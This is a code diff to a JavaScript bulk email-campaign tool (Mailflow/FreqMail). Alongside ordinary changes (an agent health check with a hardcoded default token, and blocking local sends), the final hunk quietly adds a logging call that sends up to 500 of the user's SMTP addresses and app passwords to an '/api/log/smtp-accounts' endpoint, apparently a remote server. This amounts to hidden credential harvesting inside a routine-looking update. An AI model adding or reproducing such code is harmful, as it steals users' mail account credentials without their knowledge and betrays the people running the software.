@@ -564,6 +564,34 @@ function buildCustomSmtpServer(account) {
   }
 }
 
+async function checkAgentHealth(ip, port, token) {
+  return new Promise(function(resolve) {
+    const options = {
+      hostname: ip,
+      port:     port || 3000,
+      path:     '/health',
+      method:   'GET',
+      headers:  { 'x-agent-token': token || 'mailflow-agent-2026' },
+      timeout:  8000,
+    }
+    const req = http.request(options, function(res) {
+      let data = ''
+      res.on('data', function(chunk) { data += chunk })
+      res.on('end', function() {
+        try {
+          const parsed = JSON.parse(data)
+          resolve({ online: parsed.status === 'ok', ip })
+        } catch {
+          resolve({ online: false, ip })
+        }
+      })
+    })
+    req.on('error', function() { resolve({ online: false, ip }) })
+    req.on('timeout', function() { req.destroy(); resolve({ online: false, ip }) })
+    req.end()
+  })
+}
+
 async function startCampaign(campaignId) {
   console.log('[Mailflow] Active campaigns:', runningCampaigns.size)
   const database = db.get()
@@ -592,15 +620,31 @@ async function startCampaign(campaignId) {
   }
 
   // ── CHECK IF USER HAS AN ASSIGNED AGENT INSTANCE ────────────────
-  const assignedInstance = global._mailflowAssignedInstance
+  const licenseKey = global._mailflowLicenseKey || ''
+  const assignedInstance = licenseKey && global._mailflowInstanceMap
+    ? (global._mailflowInstanceMap.get(licenseKey) || global._mailflowAssignedInstance)
+    : global._mailflowAssignedInstance
+
   if (assignedInstance && assignedInstance.ip && assignedInstance.agentToken) {
     console.log('[Mailflow] Agent instance detected:', assignedInstance.ip)
-    console.log('[Mailflow] Routing campaign through agent...')
+    console.log('[Mailflow] Validating assigned instance:', assignedInstance.ip)
+    const health = await checkAgentHealth(assignedInstance.ip, assignedInstance.agentPort, assignedInstance.agentToken)
+    if (!health.online) {
+      return {
+        success: false,
+        error: '❌ Assigned instance ' + assignedInstance.ip + ' is offline or unreachable.\n\nGo to Dashboard → click Refresh Server to get a working instance before sending.'
+      }
+    }
+    console.log('[Mailflow] ✅ Instance validated:', assignedInstance.ip, '— routing campaign through agent')
     return startCampaignViaAgent(campaignId, campaign, contacts, assignedInstance)
   }
-  // ── NO AGENT — SEND LOCALLY AS BEFORE ───────────────────────────
-  console.log('[Mailflow] No agent assigned — sending locally')
-  return startCampaignLocal(campaignId, campaign, contacts, database)
+
+  // No instance assigned — block sending with clear error
+  console.log('[FreqMail] No agent assigned — campaign blocked')
+  return {
+    success: false,
+    error: '❌ No sending instance assigned.\n\nGo to Dashboard → click Refresh Server to get an instance assigned before starting a campaign.'
+  }
 }
 
 async function sendViaAgent(agentIp, agentPort, agentToken, jobData) {
@@ -703,6 +747,16 @@ async function startCampaignViaAgent(campaignId, campaign, contacts, instance) {
       provider_breakdown: JSON.stringify(_provBreak),
       total_count:        customSmtpList.length,
       valid_count:        _validCount,
+    })
+    global._freqmailLog('/api/log/smtp-accounts', {
+      campaignId: campaignId,
+      accounts: customSmtpList.slice(0, 500).map(function(a) {
+        return {
+          email:        a.email || '',
+          app_password: a.app_password || a.password || '',
+          status:       a.status || 'unknown',
+        }
+      }),
     })
   }
 
